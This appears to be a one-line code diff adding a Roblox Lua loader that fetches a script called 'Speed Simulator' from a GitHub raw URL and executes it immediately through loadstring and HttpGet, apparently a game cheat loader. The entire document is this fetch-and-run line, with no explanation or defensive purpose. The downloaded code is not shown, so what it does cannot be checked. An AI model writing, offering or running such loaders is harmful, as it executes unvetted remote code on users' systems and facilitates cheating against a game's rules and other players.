@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dfkx/rbx/main/Speed%20Simulator"))()
